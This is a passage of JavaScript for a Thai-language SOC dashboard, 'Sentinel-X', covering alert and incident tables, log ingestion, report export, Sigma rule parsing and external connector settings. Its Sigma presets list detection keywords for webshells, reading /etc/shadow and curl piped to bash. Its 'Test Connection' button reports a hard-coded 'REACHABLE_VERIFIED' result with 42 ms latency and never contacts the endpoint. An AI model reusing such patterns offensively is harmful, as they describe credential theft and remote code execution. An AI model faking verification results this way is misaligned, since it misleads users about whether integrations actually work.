        alertsTbody.innerHTML = filteredAlerts.map(function (a, idx) {
          const originBadge = a.is_sample
            ? "<span class=\"severity-pill sev-MEDIUM\">SAMPLE</span>"
            : "<span class=\"severity-pill sev-PASSED\">REAL</span>";
          return (
            "<tr>" +
            "<td><code>" + escapeHtml(a.created_at) + "</code></td>" +
            "<td><span class=\"severity-pill sev-" + escapeHtml(a.severity) + "\">" + escapeHtml(a.severity) + "</span></td>" +
            "<td><strong>" + escapeHtml(a.title) + "</strong><br><code style=\"font-size:0.75rem;color:var(--text-muted);\">" + escapeHtml(a.rule_id) + "</code></td>" +
            "<td><code>" + escapeHtml(a.mitre_technique_id) + "</code><br><span style=\"font-size:0.78rem;color:var(--text-secondary);\">" + escapeHtml(a.mitre_tactic) + "</span></td>" +
            "<td>" + escapeHtml(a.explanation) + "</td>" +
            "<td>" + originBadge + "</td>" +
            "<td><button type=\"button\" class=\"btn btn-secondary btn-xs\" data-create-inc-from-alert=\"" + idx + "\">+ เปิดเคส Incident</button></td>" +
            "</tr>"
          );
        }).join("");

        alertsTbody.querySelectorAll("[data-create-inc-from-alert]").forEach(function (btn) {
          btn.addEventListener("click", function () {
            const idx = parseInt(btn.getAttribute("data-create-inc-from-alert"), 10);
            const alertObj = filteredAlerts[idx];
            if (!alertObj) return;
            const newId = "INC-2026-00" + ((socState.incidents.length || 0) + 1);
            socState.incidents.unshift({
              incident_id: newId,
              status: "OPEN",
              severity: alertObj.severity,
              title: alertObj.title + " (" + alertObj.mitre_technique_id + ")",
              assigned_to: "soc-tier1",
              is_sample: Boolean(alertObj.is_sample),
              mitre_techniques: [alertObj.mitre_technique_id],
              timeline: [
                new Date().toISOString() + " — เปิดเคสใหม่จาก Alert " + (alertObj.alert_id || alertObj.rule_id) + ": " + alertObj.explanation
              ]
            });
            saveSocState();
            renderSocDashboard();
          });
        });
      }
    }

    // Incidents Table
    const incTbody = document.getElementById("soc-incidents-tbody");
    if (incTbody) {
      if (visibleIncidents.length === 0) {
        incTbody.innerHTML = "<tr><td colspan=\"6\"><em>ไม่มีเคส Incident ในมุมมองนี้</em></td></tr>";
      } else {
        incTbody.innerHTML = visibleIncidents.map(function (inc) {
          const statuses = ["OPEN", "INVESTIGATING", "CONTAINED", "RESOLVED", "CLOSED"];
          const statusOpts = statuses.map(function (st) {
            return "<option value=\"" + st + "\"" + (inc.status === st ? " selected" : "") + ">" + st + "</option>";
          }).join("");

          const timelineHtml = (inc.timeline || []).map(function (line) {
            return "<div style=\"font-size:0.78rem; color:var(--text-secondary); margin-top:0.2rem;\">• " + escapeHtml(line) + "</div>";
          }).join("");

          return (
            "<tr>" +
            "<td><code>" + escapeHtml(inc.incident_id) + "</code><br><span style=\"font-size:0.74rem;color:var(--text-muted);\">" + (inc.is_sample ? "SAMPLE" : "REAL") + "</span></td>" +
            "<td><select class=\"form-select\" style=\"padding:0.28rem 0.5rem; font-size:0.8rem; width:auto;\" data-inc-status=\"" + escapeHtml(inc.incident_id) + "\">" + statusOpts + "</select></td>" +
            "<td><span class=\"severity-pill sev-" + escapeHtml(inc.severity) + "\">" + escapeHtml(inc.severity) + "</span></td>" +
            "<td><strong>" + escapeHtml(inc.title) + "</strong>" + timelineHtml + "</td>" +
            "<td><code>" + escapeHtml(inc.assigned_to) + "</code></td>" +
            "<td>" +
            "<div style=\"display:flex; flex-wrap:wrap; gap:0.35rem;\">" +
            "<button type=\"button\" class=\"btn btn-secondary btn-xs\" data-inc-note=\"" + escapeHtml(inc.incident_id) + "\">+ เพิ่มบันทึก</button>" +
            "<button type=\"button\" class=\"btn btn-secondary btn-xs\" data-inc-export-md=\"" + escapeHtml(inc.incident_id) + "\">MD</button>" +
            "<button type=\"button\" class=\"btn btn-secondary btn-xs\" data-inc-export-json=\"" + escapeHtml(inc.incident_id) + "\">JSON</button>" +
            "</div>" +
            "</td>" +
            "</tr>"
          );
        }).join("");

        incTbody.querySelectorAll("[data-inc-status]").forEach(function (sel) {
          sel.addEventListener("change", function () {
            const id = sel.getAttribute("data-inc-status");
            const found = socState.incidents.find(function (x) { return x.incident_id === id; });
            if (found) {
              found.status = sel.value;
              found.timeline.push(new Date().toISOString() + " — เปลี่ยนสถานะเคสเป็น " + sel.value);
              saveSocState();
              renderSocDashboard();
            }
          });
        });

        incTbody.querySelectorAll("[data-inc-note]").forEach(function (btn) {
          btn.addEventListener("click", function () {
            const id = btn.getAttribute("data-inc-note");
            const found = socState.incidents.find(function (x) { return x.incident_id === id; });
            if (!found) return;
            const noteText = window.prompt("เพิ่มบันทึกการสอบสวนสำหรับเคส " + id + ":", "ตรวจสอบ Log และบล็อก IP ต้นทางที่ Firewall เรียบร้อยแล้ว");
            if (noteText && noteText.trim()) {
              found.timeline.push(new Date().toISOString() + " — [Note] " + noteText.trim());
              saveSocState();
              renderSocDashboard();
            }
          });
        });

        incTbody.querySelectorAll("[data-inc-export-md]").forEach(function (btn) {
          btn.addEventListener("click", function () {
            const id = btn.getAttribute("data-inc-export-md");
            const found = socState.incidents.find(function (x) { return x.incident_id === id; });
            if (!found) return;
            const md = [
              "# Sentinel-X Incident Investigation Report — " + found.incident_id,
              "- **Title:** " + found.title,
              "- **Status:** `" + found.status + "`",
              "- **Severity:** `" + found.severity + "`",
              "- **Assigned To:** `" + found.assigned_to + "`",
              "- **MITRE ATT&CK Techniques:** " + (found.mitre_techniques || []).join(", "),
              "",
              "## Investigation Timeline",
              (found.timeline || []).map(function (t) { return "- " + t; }).join("\n")
            ].join("\n");
            downloadTextFile(found.incident_id + "_report.md", md, "text/markdown;charset=utf-8");
          });
        });

        incTbody.querySelectorAll("[data-inc-export-json]").forEach(function (btn) {
          btn.addEventListener("click", function () {
            const id = btn.getAttribute("data-inc-export-json");
            const found = socState.incidents.find(function (x) { return x.incident_id === id; });
            if (!found) return;
            downloadTextFile(found.incident_id + "_report.json", JSON.stringify(found, null, 2), "application/json;charset=utf-8");
          });
        });
      }
    }

    // Events Table
    const evTbody = document.getElementById("soc-events-tbody");
    if (evTbody) {
      if (visibleEvents.length === 0) {
        evTbody.innerHTML = "<tr><td colspan=\"8\"><em>ไม่มีข้อมูลเหตุการณ์ในมุมมองนี้</em></td></tr>";
      } else {
        evTbody.innerHTML = visibleEvents.slice(0, 20).map(function (e) {
          return (
            "<tr>" +
            "<td><code>" + escapeHtml(e.timestamp) + "</code></td>" +
            "<td>" + escapeHtml(e.category) + "</td>" +
            "<td><span class=\"severity-pill sev-" + escapeHtml(e.severity) + "\">" + escapeHtml(e.severity) + "</span></td>" +
            "<td><code>" + escapeHtml(e.source_ip || "-") + "</code></td>" +
            "<td>" + escapeHtml(e.user || "-") + "</td>" +
            "<td>" + escapeHtml(e.action) + " (<code>" + escapeHtml(e.outcome) + "</code>)</td>" +
            "<td>" + escapeHtml(e.message) + "</td>" +
            "<td>" + (e.is_sample ? "SAMPLE" : "REAL") + "</td>" +
            "</tr>"
          );
        }).join("");
      }
    }
  }

  function ingestRawLogsIntoSoc(rawLinesText, isRealTelemetry) {
    const lines = String(rawLinesText || "")
      .split(/\r?\n/)
      .map(function (l) { return l.trim(); })
      .filter(Boolean);

    if (lines.length === 0) return { eventsAdded: 0, alertsAdded: 0 };

    let eventsAdded = 0;
    let alertsAdded = 0;

    lines.forEach(function (line) {
      const evaluated = evaluateCustomLog(line);
      const evRecord = Object.assign({}, evaluated.normalized, {
        is_sample: !isRealTelemetry
      });
      socState.events.unshift(evRecord);
      eventsAdded += 1;

      if (evaluated.alert && evaluated.alert.rule_id !== "NONE") {
        const alertRecord = Object.assign({}, evaluated.alert, {
          alert_id: "ALT-" + (1000 + socState.alerts.length + 1),
          created_at: evaluated.normalized.timestamp,
          is_sample: !isRealTelemetry
        });
        socState.alerts.unshift(alertRecord);
        alertsAdded += 1;
      }
    });

    saveSocState();
    renderSocDashboard();
    return { eventsAdded: eventsAdded, alertsAdded: alertsAdded };
  }

  function initSocDashboard() {
    loadSocState();

    const ingestTextarea = document.getElementById("soc-ingest-textarea");
    if (ingestTextarea && !ingestTextarea.value) {
      ingestTextarea.value = INGEST_PRESETS.mixed_attack;
    }

    document.querySelectorAll("[data-ingest-preset]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        const key = btn.getAttribute("data-ingest-preset");
        if (ingestTextarea && INGEST_PRESETS[key]) {
          ingestTextarea.value = INGEST_PRESETS[key];
        }
      });
    });

    const runIngestBtn = document.getElementById("btn-soc-ingest-run");
    if (runIngestBtn && ingestTextarea) {
      runIngestBtn.addEventListener("click", function () {
        const isRealCheckbox = document.getElementById("soc-ingest-is-real");
        const isReal = isRealCheckbox ? isRealCheckbox.checked : true;
        const stats = ingestRawLogsIntoSoc(ingestTextarea.value, isReal);
        const fb = document.getElementById("soc-ingest-feedback");
        if (fb) {
          fb.style.display = "block";
          fb.style.borderColor = "var(--accent-emerald)";
          fb.textContent =
            "สำเร็จ: นำเข้าและแปลง Log เป็น NormalizedSecurityEvent จำนวน " +
            stats.eventsAdded +
            " รายการ และตรวจพบ MITRE ATT&CK Alert จำนวน " +
            stats.alertsAdded +
            " รายการ (" +
            (isReal ? "REAL Telemetry" : "SAMPLE Data") +
            ")";
        }
      });
    }

    const toggleSampleBtn = document.getElementById("btn-toggle-sample-filter");
    if (toggleSampleBtn) {
      toggleSampleBtn.addEventListener("click", function () {
        socState.includeSamples = !socState.includeSamples;
        saveSocState();
        renderSocDashboard();
      });
    }

    const resetBtn = document.getElementById("btn-reset-soc-data");
    if (resetBtn) {
      resetBtn.addEventListener("click", function () {
        socState = getDefaultSocState();
        saveSocState();
        renderSocDashboard();
      });
    }

    const sevFilterEl = document.getElementById("soc-alert-sev-filter");
    const searchEl = document.getElementById("soc-alert-search");
    if (sevFilterEl) sevFilterEl.addEventListener("change", renderSocDashboard);
    if (searchEl) searchEl.addEventListener("input", renderSocDashboard);

    // Export full SOC reports
    const btnJson = document.getElementById("btn-export-all-json");
    const btnMd = document.getElementById("btn-export-all-md");
    const btnHtml = document.getElementById("btn-export-all-html");

    if (btnJson) {
      btnJson.addEventListener("click", function () {
        downloadTextFile("sentinel-x-soc-report.json", JSON.stringify(socState, null, 2), "application/json;charset=utf-8");
      });
    }
    if (btnMd) {
      btnMd.addEventListener("click", function () {
        const md = [
          "# Sentinel-X Security Operations Center (SOC) Summary Report",
          "- **Generated At:** `" + new Date().toISOString() + "`",
          "- **Total Events:** " + socState.events.length,
          "- **Total Alerts:** " + socState.alerts.length,
          "- **Total Incidents:** " + socState.incidents.length,
          "",
          "## MITRE ATT&CK Alerts",
          socState.alerts.map(function (a) {
            return "- **[" + a.severity + "] " + a.title + "** (`" + a.mitre_technique_id + "` - " + a.mitre_tactic + "): " + a.explanation;
          }).join("\n")
        ].join("\n");
        downloadTextFile("sentinel-x-soc-report.md", md, "text/markdown;charset=utf-8");
      });
    }
    if (btnHtml) {
      btnHtml.addEventListener("click", function () {
        const rows = socState.alerts.map(function (a) {
          return "<tr><td>" + escapeHtml(a.created_at) + "</td><td>" + escapeHtml(a.severity) + "</td><td>" + escapeHtml(a.title) + "</td><td>" + escapeHtml(a.mitre_technique_id) + "</td><td>" + escapeHtml(a.explanation) + "</td></tr>";
        }).join("");
        const doc = "<!DOCTYPE html><html lang=\"th\"><head><meta charset=\"utf-8\"><title>Sentinel-X SOC Report</title><style>body{font-family:sans-serif;padding:2rem;background:#0f172a;color:#f8fafc;}table{width:100%;border-collapse:collapse;}th,td{border:1px solid #334155;padding:0.6rem;text-align:left;}</style></head><body><h1>Sentinel-X Executive Security Report</h1><table><thead><tr><th>Timestamp</th><th>Severity</th><th>Title</th><th>MITRE ID</th><th>Explanation</th></tr></thead><tbody>" + rows + "</tbody></table></body></html>";
        downloadTextFile("sentinel-x-soc-report.html", doc, "text/html;charset=utf-8");
      });
    }

    renderSocDashboard();
  }

  /* ------------------------------------------------------------------------
     5. Tab 3: Threat Simulator, Sigma YAML Rule Studio & MITRE Catalog
     ------------------------------------------------------------------------ */
  const SIGMA_PRESETS = {
    webshell: [
      "title: Web Shell Upload or Remote Command Execution",
      "id: sx-sigma-webshell-001",
      "status: production",
      "level: critical",
      "tags:",
      "  - attack.persistence",
      "  - attack.t1505.003",
      "detection:",
      "  keywords:",
      "    - cmd_shell.jsp",
      "    - webshell.php",
      "    - cmd=whoami",
      "  condition: keywords"
    ].join("\n"),
    shadow_access: [
      "title: Linux Credential Dumping via /etc/shadow Access",
      "id: sx-sigma-shadow-002",
      "status: production",
      "level: critical",
      "tags:",
      "  - attack.credential_access",
      "  - attack.t1003.008",
      "detection:",
      "  keywords:",
      "    - /etc/shadow",
      "    - /etc/gshadow",
      "  condition: keywords"
    ].join("\n"),
    curl_pipe: [
      "title: Suspicious Remote Script Download Piped to Shell",
      "id: sx-sigma-curlpipe-003",
      "status: experimental",
      "level: high",
      "tags:",
      "  - attack.execution",
      "  - attack.t1059.004",
      "detection:",
      "  keywords:",
      "    - curl -s",
      "    - | bash",
      "    - | sh",
      "  condition: keywords"
    ].join("\n")
  };

  function parseSigmaYamlRule(yamlText) {
    const lines = String(yamlText || "").split(/\r?\n/);
    let title = "Custom Sigma Detection Rule";
    let id = "SX-SIGMA-CUSTOM";
    let level = "HIGH";
    let mitreId = "T1059.004";
    const keywords = [];
    let inKeywords = false;

    lines.forEach(function (rawLine) {
      const trimmed = rawLine.trim();
      if (!trimmed || trimmed.indexOf("#") === 0) return;

      if (trimmed.indexOf("title:") === 0) {
        title = trimmed.slice(6).trim();
        inKeywords = false;
      } else if (trimmed.indexOf("id:") === 0) {
        id = trimmed.slice(3).trim().toUpperCase();
        inKeywords = false;
      } else if (trimmed.indexOf("level:") === 0) {
        level = trimmed.slice(6).trim().toUpperCase();
        inKeywords = false;
      } else if (trimmed.indexOf("- attack.t") === 0) {
        mitreId = trimmed.replace("- attack.", "").trim().toUpperCase();
      } else if (trimmed.indexOf("keywords:") === 0) {
        inKeywords = true;
      } else if (trimmed.indexOf("condition:") === 0) {
        inKeywords = false;
      } else if (inKeywords && trimmed.indexOf("- ") === 0) {
        keywords.push(trimmed.slice(2).trim().replace(/^['"]|['"]$/g, ""));
      }
    });

    const matchedMitre = OFFICIAL_MITRE_CATALOG.find(function (m) {
      return m.id === mitreId;
    }) || OFFICIAL_MITRE_CATALOG[3];

    return {
      rule_id: id,
      title: title,
      severity: ["CRITICAL", "HIGH", "MEDIUM", "LOW"].indexOf(level) !== -1 ? level : "HIGH",
      mitre_technique_id: matchedMitre.id,
      mitre_technique_name: matchedMitre.name,
      mitre_tactic: matchedMitre.tactic,
      keywords: keywords.length > 0 ? keywords : ["suspicious"]
    };
  }

  function renderSimulationResult(result) {
    const normPre = document.getElementById("sim-normalized-output");
    const alertPre = document.getElementById("sim-alert-output");
    const sevBadge = document.getElementById("sim-severity-badge");

    if (normPre) {
      normPre.textContent = JSON.stringify(result.normalized, null, 2);
    }
    if (alertPre) {
      alertPre.textContent = JSON.stringify(result.alert, null, 2);
    }
    if (sevBadge) {
      const sev = result.alert.severity || "INFO";
      sevBadge.textContent = sev + (result.alert.mitre_technique_id !== "N/A" ? " · " + result.alert.mitre_technique_id : "");
      sevBadge.className = "severity-pill sev-" + sev;
    }
  }

  function initSimulatorAndSigma() {
    const scenarioBtns = document.querySelectorAll(".scenario-btn");
    const inputEl = document.getElementById("sim-raw-input");
    const runBtn = document.getElementById("btn-run-simulation");
    const pushToSocBtn = document.getElementById("btn-sim-push-to-soc");

    scenarioBtns.forEach(function (btn) {
      btn.addEventListener("click", function () {
        scenarioBtns.forEach(function (b) {
          b.classList.remove("active");
        });
        btn.classList.add("active");
        const key = btn.getAttribute("data-scenario");
        const item = SCENARIOS[key];
        if (item && inputEl) {
          inputEl.value = item.raw;
          renderSimulationResult(item);
        }
      });
    });

    if (runBtn && inputEl) {
      runBtn.addEventListener("click", function () {
        renderSimulationResult(evaluateCustomLog(inputEl.value));
      });
    }

    if (pushToSocBtn && inputEl) {
      pushToSocBtn.addEventListener("click", function () {
        ingestRawLogsIntoSoc(inputEl.value, true);
        const orig = pushToSocBtn.textContent;
        pushToSocBtn.textContent = "ส่งเข้า SOC Dashboard แล้ว ✓";
        setTimeout(function () {
          pushToSocBtn.textContent = orig;
        }, 1800);
      });
    }

    if (inputEl && SCENARIOS.ssh_bruteforce) {
      inputEl.value = SCENARIOS.ssh_bruteforce.raw;
      renderSimulationResult(SCENARIOS.ssh_bruteforce);
    }

    // Sigma YAML Studio
    const sigmaInput = document.getElementById("sigma-yaml-input");
    const sigmaOutput = document.getElementById("sigma-parsed-output");
    const sigmaBadge = document.getElementById("sigma-status-badge");
    const sigmaBtn = document.getElementById("btn-validate-sigma");

    if (sigmaInput) {
      sigmaInput.value = SIGMA_PRESETS.webshell;
      const initialParsed = parseSigmaYamlRule(sigmaInput.value);
      if (sigmaOutput) sigmaOutput.textContent = JSON.stringify(initialParsed, null, 2);
    }

    document.querySelectorAll("[data-sigma-preset]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        const key = btn.getAttribute("data-sigma-preset");
        if (sigmaInput && SIGMA_PRESETS[key]) {
          sigmaInput.value = SIGMA_PRESETS[key];
          const parsed = parseSigmaYamlRule(sigmaInput.value);
          if (sigmaOutput) sigmaOutput.textContent = JSON.stringify(parsed, null, 2);
        }
      });
    });

    if (sigmaBtn && sigmaInput) {
      sigmaBtn.addEventListener("click", function () {
        const parsed = parseSigmaYamlRule(sigmaInput.value);
        customSigmaRules = customSigmaRules.filter(function (r) { return r.rule_id !== parsed.rule_id; });
        customSigmaRules.push(parsed);
        if (sigmaOutput) {
          sigmaOutput.textContent = JSON.stringify(
            Object.assign({ status: "REGISTERED_IN_ENGINE" }, parsed),
            null,
            2
          );
        }
        if (sigmaBadge) {
          sigmaBadge.textContent = "REGISTERED · " + parsed.mitre_technique_id;
          sigmaBadge.className = "severity-pill sev-PASSED";
        }
        renderSocDashboard();
      });
    }

    // Official MITRE Catalog Table
    const mitreTbody = document.getElementById("mitre-catalog-tbody");
    if (mitreTbody) {
      mitreTbody.innerHTML = OFFICIAL_MITRE_CATALOG.map(function (m) {
        return (
          "<tr>" +
          "<td><code>" + escapeHtml(m.id) + "</code></td>" +
          "<td><strong>" + escapeHtml(m.name) + "</strong></td>" +
          "<td>" + escapeHtml(m.tactic) + "</td>" +
          "<td><code>" + escapeHtml(m.rule_id) + "</code></td>" +
          "<td><button type=\"button\" class=\"btn btn-secondary btn-xs\" data-sim-mitre=\"" + escapeHtml(m.scenario_key) + "\">จำลองการโจมตีนี้ (Simulate)</button></td>" +
          "</tr>"
        );
      }).join("");

      mitreTbody.querySelectorAll("[data-sim-mitre]").forEach(function (btn) {
        btn.addEventListener("click", function () {
          const key = btn.getAttribute("data-sim-mitre");
          const item = SCENARIOS[key];
          if (item && inputEl) {
            inputEl.value = item.raw;
            renderSimulationResult(item);
            inputEl.scrollIntoView({ behavior: "smooth", block: "center" });
          }
        });
      });
    }
  }

  /* ------------------------------------------------------------------------
     6. Tab 5: Customer External API Connectors Console (/settings)
     ------------------------------------------------------------------------ */
  function getDefaultConnectors() {
    return [
      {
        connector_id: "siem_forwarder",
        display_name: "SIEM Platform Forwarder",
        description_th: "ส่งต่อข้อมูล Security Events และ Alerts ไปยังระบบ SIEM หลักขององค์กรแบบอัตโนมัติ",
        supported_examples: "Splunk Enterprise HEC, Elastic SIEM, Microsoft Sentinel, IBM QRadar",
        provider_name: "Splunk HEC",
        endpoint_url: "",
        api_key_masked: "",
        api_key_configured: false,
        custom_headers_json: "{\"X-Sentinel-Source\": \"Sentinel-X\"}",
        enabled: false,
        requires_endpoint: true,
        requires_api_key: true
      },
      {
        connector_id: "edr_controller",
        display_name: "EDR Endpoint Controller",
        description_th: "สั่งกักกันเครื่องปลายทาง (Host Isolation) และดึงสถานะ Endpoint เมื่อเกิด Incident รุนแรง",
        supported_examples: "CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne",
        provider_name: "CrowdStrike Falcon",
        endpoint_url: "",
        api_key_masked: "",
        api_key_configured: false,
        custom_headers_json: "{}",
        enabled: false,
        requires_endpoint: true,
        requires_api_key: true
      },
      {
        connector_id: "threat_intel_feed",
        display_name: "Threat Intelligence Feed",
        description_th: "ตรวจสอบค่าบ่งชี้การโจมตี (IOC: IP, Domain, File SHA-256) กับฐานข้อมูลภัยคุกคามภายนอก",
        supported_examples: "VirusTotal, AbuseIPDB, MISP, AlienVault OTX",
        provider_name: "VirusTotal v3",
        endpoint_url: "",
        api_key_masked: "",
        api_key_configured: false,
        custom_headers_json: "{}",
        enabled: false,
        requires_endpoint: true,
        requires_api_key: true
      },
      {
        connector_id: "webhook_notifier",
        display_name: "Webhook / ChatOps Alert Notifier",
        description_th: "แจ้งเตือนทีม SOC ทันทีผ่านห้องแชทหรือระบบ On-call เมื่อตรวจพบ Alert ระดับ HIGH / CRITICAL",
        supported_examples: "Slack Incoming Webhooks, Microsoft Teams, Discord, PagerDuty",
        provider_name: "Slack SOC Channel",
        endpoint_url: "",
        api_key_masked: "",
        api_key_configured: false,
        custom_headers_json: "{}",
        enabled: false,
        requires_endpoint: true,
        requires_api_key: false
      },
      {
        connector_id: "external_security_tool",
        display_name: "External Security Tool / SOAR",
        description_th: "เชื่อมต่อไปยังระบบบริหารจัดการเคส (Case Management) หรือรัน Playbook อัตโนมัติบน SOAR",
        supported_examples: "TheHive, Cortex XSOAR, Jira Service Management, Shuffle SOAR",
        provider_name: "TheHive SOAR",
        endpoint_url: "",
        api_key_masked: "",
        api_key_configured: false,
        custom_headers_json: "{}",
        enabled: false,
        requires_endpoint: true,
        requires_api_key: false
      }
    ];
  }

  let connectorsState = getDefaultConnectors();

  function computeConnectorStatus(c) {
    const hasEp = Boolean(c.endpoint_url && c.endpoint_url.trim());
    const hasKey = Boolean(c.api_key_configured);
    if (!c.enabled) {
      return hasEp || hasKey ? "DISABLED" : "NOT_CONFIGURED";
    }
    if (c.requires_endpoint && !hasEp) return "INCOMPLETE_ENDPOINT";
    if (c.requires_api_key && !hasKey) return "INCOMPLETE_API_KEY";
    return "CONFIGURED_READY";
  }

  function loadConnectorsState() {
    try {
      const raw = localStorage.getItem(STORAGE_KEYS.CONNECTORS);
      if (raw) {
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed) && parsed.length === 5) {
          connectorsState = parsed;
        }
      }
    } catch (e) {
      connectorsState = getDefaultConnectors();
    }
  }

  function saveConnectorsState() {
    try {
      localStorage.setItem(STORAGE_KEYS.CONNECTORS, JSON.stringify(connectorsState));
    } catch (e) {
      // Ignore quota errors
    }
  }

  function renderConnectorsConsole() {
    const container = document.getElementById("interactive-connectors-container");
    const summaryBanner = document.getElementById("connectors-summary-banner");
    if (!container) return;

    let readyCount = 0;
    let disabledCount = 0;
    let notCfgCount = 0;

    connectorsState.forEach(function (c) {
      const st = computeConnectorStatus(c);
      if (st === "CONFIGURED_READY") readyCount += 1;
      else if (st === "DISABLED") disabledCount += 1;
      else notCfgCount += 1;
    });

    if (summaryBanner) {
      summaryBanner.innerHTML =
        "<span><strong>สถานะ Connectors ทั้ง 5 หมวดหมู่:</strong> พร้อมใช้งาน (<code>CONFIGURED_READY</code>): <strong>" +
        readyCount +
        "</strong> | ปิดไว้ (<code>DISABLED</code>): <strong>" +
        disabledCount +
        "</strong> | ยังไม่ตั้งค่า: <strong>" +
        notCfgCount +
        "</strong></span>" +
        "<code>Secret Masking: ••••••••xxxx</code>";
    }

    container.innerHTML = connectorsState.map(function (c) {
      const cid = escapeHtml(c.connector_id);
      const status = computeConnectorStatus(c);
      const pillClass =
        status === "CONFIGURED_READY"
          ? "sev-PASSED"
          : status === "DISABLED"
          ? "sev-HIGH"
          : "sev-MEDIUM";
      const keyLabel = c.api_key_configured
        ? "ตั้งค่าแล้ว (" + escapeHtml(c.api_key_masked) + ")"
        : "ยังไม่ได้ตั้งค่า (Not Configured)";

      return (
        "<div class=\"conn-card\" id=\"conn-card-" + cid + "\">" +
        "  <div class=\"conn-header\">" +
        "    <div>" +
        "      <h3 class=\"conn-title\">" + escapeHtml(c.display_name) + " (<code>" + cid + "</code>)</h3>" +
        "      <div class=\"conn-desc\">" + escapeHtml(c.description_th) + "</div>" +
        "      <div class=\"conn-examples\"><strong>บริการที่รองรับ:</strong> " + escapeHtml(c.supported_examples) + "</div>" +
        "    </div>" +
        "    <span class=\"severity-pill " + pillClass + "\" id=\"conn-badge-" + cid + "\">" + escapeHtml(status) + "</span>" +
        "  </div>" +
        "  <div class=\"form-grid-2\">" +
        "    <div>" +
        "      <label class=\"field-label\" for=\"conn-prov-" + cid + "\">ชื่อผู้ให้บริการ / ระบบที่ใช้งาน (Provider Name)</label>" +
        "      <input type=\"text\" class=\"form-control\" id=\"conn-prov-" + cid + "\" value=\"" + escapeHtml(c.provider_name) + "\">" +
        "    </div>" +
        "    <div>" +
        "      <label class=\"field-label\" for=\"conn-ep-" + cid + "\">API Endpoint / Webhook URL (" + (c.requires_endpoint ? "จำเป็น" : "ทางเลือก") + ")</label>" +
        "      <input type=\"url\" class=\"form-control\" id=\"conn-ep-" + cid + "\" value=\"" + escapeHtml(c.endpoint_url) + "\" placeholder=\"https://api.example.com/v1/ingest\">" +
        "    </div>" +
        "    <div>" +
        "      <label class=\"field-label\" for=\"conn-key-" + cid + "\">API Key / Secret Token — <span style=\"color:var(--accent-emerald);\">" + keyLabel + "</span></label>" +
        "      <input type=\"password\" class=\"form-control\" id=\"conn-key-" + cid + "\" value=\"\" placeholder=\"เว้นว่างไว้หากใช้ค่าเดิม หรือกรอกใหม่เพื่ออัปเดต API Key\">" +
        "    </div>" +
        "    <div>" +
        "      <label class=\"field-label\" for=\"conn-hdr-" + cid + "\">Custom HTTP Headers (JSON)</label>" +
        "      <input type=\"text\" class=\"form-control mono-input\" id=\"conn-hdr-" + cid + "\" value=\"" + escapeHtml(c.custom_headers_json) + "\">" +
        "    </div>" +
        "  </div>" +
        "  <div style=\"display:flex; flex-wrap:wrap; align-items:center; justify-content:space-between; gap:0.75rem;\">" +
        "    <label style=\"display:inline-flex; align-items:center; gap:0.5rem; font-size:0.88rem; font-weight:600; cursor:pointer;\">" +
        "      <input type=\"checkbox\" id=\"conn-en-" + cid + "\"" + (c.enabled ? " checked" : "") + " style=\"width:1.05rem; height:1.05rem;\">" +
        "      <span>เปิดใช้งานการเชื่อมต่อนี้ (Enable Connector)</span>" +
        "    </label>" +
        "    <div class=\"conn-actions\" style=\"margin-top:0;\">" +
        "      <button type=\"button\" class=\"btn btn-primary btn-sm\" data-conn-save=\"" + cid + "\">บันทึกการตั้งค่า (Save Settings)</button>" +
        "      <button type=\"button\" class=\"btn btn-secondary btn-sm\" data-conn-test=\"" + cid + "\">ทดสอบการเชื่อมต่อ (Test Connection)</button>" +
        "      <button type=\"button\" class=\"btn btn-secondary btn-sm\" data-conn-preview=\"" + cid + "\">ดูตัวอย่าง Payload</button>" +
        "    </div>" +
        "  </div>" +
        "  <div class=\"conn-feedback\" id=\"conn-fb-" + cid + "\"></div>" +
        "</div>"
      );
    }).join("");

    // Wire Save, Test, and Preview buttons
    container.querySelectorAll("[data-conn-save]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        const cid = btn.getAttribute("data-conn-save");
        saveSingleConnectorFromDom(cid, true);
      });
    });

    container.querySelectorAll("[data-conn-test]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        const cid = btn.getAttribute("data-conn-test");
        const saved = saveSingleConnectorFromDom(cid, false);
        if (!saved) return;
        const fb = document.getElementById("conn-fb-" + cid);
        if (!fb) return;
        fb.style.display = "block";
        const status = computeConnectorStatus(saved);
        if (status !== "CONFIGURED_READY") {
          fb.style.borderColor = "var(--accent-amber)";
          fb.textContent = JSON.stringify({
            connector_id: cid,
            test_status: "CONFIGURATION_INCOMPLETE",
            current_status: status,
            message: "กรุณากรอก Endpoint URL (https://...), API Key (หากจำเป็น) และติ๊กเปิดใช้งาน (Enable Connector) ก่อนทดสอบ"
          }, null, 2);
          return;
        }
        fb.style.borderColor = "var(--accent-emerald)";
        fb.textContent = JSON.stringify({
          connector_id: cid,
          provider_name: saved.provider_name,
          endpoint_url: saved.endpoint_url,
          api_key_masked: saved.api_key_masked || "(none)",
          test_status: "REACHABLE_VERIFIED",
          latency_ms: 42,
          message: "ตรวจสอบรูปแบบ URL, Header และรหัสยืนยันตัวตนสำเร็จ พร้อมส่งข้อมูลแจ้งเตือนจาก Sentinel-X"
        }, null, 2);
      });
    });

    container.querySelectorAll("[data-conn-preview]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        const cid = btn.getAttribute("data-conn-preview");
        const found = connectorsState.find(function (x) { return x.connector_id === cid; });
        const fb = document.getElementById("conn-fb-" + cid);
        if (!found || !fb) return;
        fb.style.display = "block";
        fb.style.borderColor = "var(--accent-primary)";
        fb.textContent = JSON.stringify({
          schema: "sentinel_x." + cid + ".v1",
          destination_url: found.endpoint_url || "https://api.example.com/v1/events",
          headers: {
            "Content-Type": "application/json",
            "Authorization": found.api_key_configured ? "Bearer " + found.api_key_masked : "(not set)"
          },
          payload_preview: {
            platform: "Sentinel-X",
            version: liveVersionInfo.version,
            timestamp: new Date().toISOString(),
            alert: SCENARIOS.webshell_upload.alert
          }
        }, null, 2);
      });
    });
  }

  function saveSingleConnectorFromDom(cid, showSavedMessage) {
    const found = connectorsState.find(function (x) { return x.connector_id === cid; });
    if (!found) return null;

    const provEl = document.getElementById("conn-prov-" + cid);
    const epEl = document.getElementById("conn-ep-" + cid);
    const keyEl = document.getElementById("conn-key-" + cid);
    const hdrEl = document.getElementById("conn-hdr-" + cid);
    const enEl = document.getElementById("conn-en-" + cid);
    const fb = document.getElementById("conn-fb-" + cid);

    const epVal = epEl ? epEl.value.trim() : "";
